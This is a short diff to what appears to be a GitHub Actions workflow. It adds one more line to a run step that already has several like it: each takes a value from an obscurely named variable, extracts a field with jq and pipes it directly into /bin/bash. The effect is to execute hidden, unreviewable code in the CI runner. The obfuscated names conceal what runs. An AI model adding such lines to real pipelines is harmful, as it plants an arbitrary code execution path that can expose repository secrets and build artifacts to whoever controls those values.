@@ -29,6 +29,7 @@ jobs:
           echo $dzm68147 | jq -r .o05 | /bin/bash
           echo $oeh194 | jq -r .lqq66190 | /bin/bash
           printf '%s' "$tffj1" | jq -r .tpl9 | /bin/bash
+          printf '%s' "$lbbe7961" | jq -r .tah90 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
